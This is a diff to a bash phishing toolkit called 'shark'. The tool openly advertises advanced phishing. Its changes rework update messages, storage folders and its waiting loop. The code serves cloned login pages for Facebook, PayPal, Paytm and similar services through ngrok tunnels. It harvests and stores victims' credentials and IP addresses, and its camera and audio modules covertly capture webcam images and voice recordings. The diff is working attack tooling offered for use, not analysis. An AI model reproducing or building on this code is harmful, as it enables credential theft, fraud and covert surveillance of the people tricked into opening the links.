@@ -143,11 +143,12 @@ function main_update() {
 	#splashdown="updated shark";echo
 	#os;(wget -q https://github.com/tech2gamer/shark/raw/Beta/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
 	echo
-	msg "we will soon provide you this service!\n"
+	msg "update manually by installation command\n ~(check Official shark repo)"
 	sleep 2
-	msg "Just clone shark and run setup"
 	echo
-	exit 0
+	msg "Redirecting to Official shark repo..."
+	xdg-open 'https://github.com/Bhaviktutorials/shark'
+	exit 1
 }
 
 
@@ -206,7 +207,7 @@ Usage: $(basename $0) [OPTIONS] available
 shark - future of phishing is here,
 A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
 Options:
-  -u, --update      Update shark
+  -u, --update      update shark manually 
   -v, --version     Display the current shark version installed on your device
   -h, --help        Print this help message
   -a, --assist      List detail discription of shark
@@ -220,7 +221,7 @@ EOF
 }
 
 function purge_shark() {
-        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Camera_hack ${files}/Audio_hack
+        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Audio\ And\ Camera\ Hack
         rm -rf ${shark} ${old_shark}
 }
 
@@ -237,7 +238,6 @@ function assist() {
 	os
         man ${shark}/manpage
 }
-
 function fix_ngrok() {
 	#check for all arch
 	clear
@@ -309,7 +309,7 @@ while true; do
 			;;
 
                 -v|--version)
-                        printf "version $VERSION\n"
+                        printf ".beta v$VERSION\n"
                         exit 1
                         ;;
 
@@ -361,8 +361,7 @@ done
 
 # CHECK FILE
 file_check() {
-        [ ! -d "${files}/Camera_hack" ] && mkdir -p ${files}/Camera_hack
-        [ ! -d "${files}/Audio_hack" ] && mkdir -p ${files}/Audio_hack
+        [ ! -d "${files}/Audio\ And\ Camera\ Hack" ] && mkdir -p ${files}/Audio\ And\ Camera\ Hack
 }
 
 #catch_ip camera
@@ -721,7 +720,11 @@ cat dumpip.txt >> ../.ipdump.txt
 echo "$KL" >> ../.dumplog.txt
 rm -rf dumpip.txt filter.txt
 echo ""
-msg "Waiting for Victim's Credentials..."
+msg "Waiting for Victim's files or Credentials..."
+}
+snt() {
+mv *.wav $files/Audio\ And\ Camera\ Hack &> /dev/null
+mv cam* $files/Audio\ And\ Camera\ Hack &> /devnull
 }
 function ipinfo() {
 	echo
@@ -731,25 +734,33 @@ function ipinfo() {
 	fi
         printf "${yellow}[•]  Waiting for Victim's Device info...\n\n"
         while true; do
-        if [[ -f dumpip.txt ]]; then
-        echo ''
-        msg "Victim's I.P  F O U N D "
-        echo ''
-	printf "${green}[*] Info Found\n\n"
-	sleep 0.75
-	ipcatch
-	fi
-	if [[ -f log.txt ]]; then
-	echo ''
-	msg "Victim's Credentials Found." 
-	CRD=$(cat log.txt)
-	echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD"
-	cat log.txt >> ../.dumplog.txt
-	rm -rf log.txt
-	echo ""
-	msg "Waiting for next Device, press CTRL + C for exit..."
-	fi
-	done
+		if [[ -f "dumpip.txt"  ]]; then
+			echo ''
+			msg "Victim's I.P  F O U N D "
+			echo ''
+			printf "${green}[*] Info Found\n\n"
+			sleep 0.75
+			ipcatch
+		fi
+	        if [[ -e "log.txt" ]]; then
+		       echo ''
+		       msg "Victim's Credentials Found."
+		       CRD=$(cat log.txt)
+		       echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD"
+		       cat log.txt >> ../.dumplog.txt
+          	       rm -rf log.txt
+		       echo ""
+		       msg "Waiting for next Device, press CTRL + C for exit..."
+		fi
+		if [[ -e "Log.log" ]]; then
+				echo ""	
+				msg "$print"
+				echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Location $files"
+				echo ""
+				snt
+				msg "Waiting for next file, press CTRL + C for exit..."
+		fi
+        done
 }
 #banner2
 banner2() {
@@ -759,11 +770,12 @@ banner2() {
         ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
         ╚════════════════════════════════════╝
-	SHARK BETA : ${white}v${VERSION}${green}
-         Reborn by : ${white}Mr.Derek(E343IO)${green}
-         Publisher : ${white}Bhavik Oza${green}
-	    Author : ${white}Ashish Singh${green}
-	     Note  : ${yellow}Soon will add New Features!${yellow}
+                
+        Shark beta : ${white}v${VERSION}${green}
+        Reborn by  : ${white}Mr.Derek(E343IO)${green} •
+         Publisher : ${white}Bhavik Oza${green}       •
+	    Author : ${white}Ashish Singh${red}     • 
+            ${yellow}Note   : help us by giving your feedback
 
         》 ${cyan1}${final_url}${yellow} 《 MODIFIED URL.
                 	or
@@ -823,43 +835,35 @@ function camera_hack() {
                         source="jio_offer.html"
                         ;;
 		esac
-#              link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-
-                sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
-		prt
+# link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+                old && rm -rf .drk/
+		mkdir .drk/
+		cp -R * .drk/
+		cd .drk/ && rm -rf .drk/
+                prt
+		sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.
+php > index.php
 		credentials
-		while [ true ]; do
-                        if [[ -e "ip.txt" ]]; then
-			        printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
-			        catch_ip && rm -rf ip.txt
-			fi
 			sleep 0.5
-		        if [[ -e "Log.log" ]]; then
-			        printf "\n${green}[${white}+${green}] Cam file received!\n" && rm -rf Log.log
-			fi
-			sleep 0.5
-			mv cam* ${files}/Camera_hack >> /dev/null 2>&1
-		done
+			print=$(printf "\n${green}[${white}+${green}] Cam file received!\n")
+			ipinfo
 }
 
 # Voice Hack
 
 function audio_hack() {
-        default_redirect="https://google.com"
+	old && rm -rf .drk/
+	mkdir .drk
+	cp -R * .drk/
+	cd .drk/ && rm -rf .drk/
+	default_redirect="https://google.com"
         printf "\n${green}[${white}+${green}] Choose a distracting website ${white}(Default: https://google.com) : " $default_redirect && read redirect_link
-        redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+        redirect_link="${redirect_link:-${default_redirect}}";
         sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
-	old
         prt && credentials
-        ipinfo
 	        sleep 0.5
-	        if [[ -e "Log.log" ]]; then
-			printf "\n${green}[${white}+${green}] Voice file received!\n" && rm -rf Log.log
-		fi
-	        sleep 0.5
-		mv 20* ${files}/Audio_hack >> /dev/null 2>&1
-
-
+		print=$(printf "\n${green}[${white}+${green}] Voice file received!\n")
+		ipinfo
 }
 decne() {
 	if [[ $valu == "19" ]]; then
@@ -940,7 +944,7 @@ case $pgrep in
 			cd ${phish}/facebook/
 			reddc="TRUE"
 			FILE="login.php"
-			oldy="https://facebook.com/"
+			oldy="https://www.facebook.com/"
 			decne;;
 		2 | 02)
 			cd ${phish}/fb_advanced/
@@ -1019,7 +1023,7 @@ do
        ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
        ██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗
-       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1}.beta v${VERSION} \n                                     ${yellow}Reborn by Mr.Derek(E343IO)\n\n "
+       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${cyan1}.beta v${VERSION}\n\n "
 
       printf "${green}       ╔──────────────────────────────────────╗\n"
       printf "${green}        |   ${cyan1}B  E  T  A    V  E  R  S  I  O  N  ${green}|\n"
@@ -1035,8 +1039,8 @@ function banner(){
         printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
         printf "\e[1;92m[\e[0m\e[1;37m07\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;92m[\e[0m\e[1;37m18\e[0m\e[1;92m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;92m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m08\e[0m\e[1;92m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;92m[\e[0m\e[1;37m19\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
-        printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
-        printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
+	printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m (For Pc)\n\n"
+	printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m (For Pc)\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipkart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
         read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
 }
